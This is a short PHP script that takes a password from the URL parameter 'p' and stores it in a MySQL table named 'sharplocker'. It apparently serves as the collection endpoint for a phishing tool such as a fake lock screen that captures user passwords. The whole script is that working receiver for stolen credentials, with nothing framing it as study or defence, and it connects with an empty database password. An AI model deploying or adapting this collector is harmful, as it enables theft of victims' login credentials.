<?php

$servername = "localhost";
$username = "fpm";
$password = "";

// Create connection
$conn = mysqli_connect($servername, $username, $password);

// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

$sql = $conn->prepare("INSERT INTO data.sharplocker (password) VALUES (?)");
$sql->bind_param("s", $_GET["p"]);

if ($sql->execute() === TRUE) {
    echo "New record created successfully";
} else {
    echo "Error";
}

$conn->close();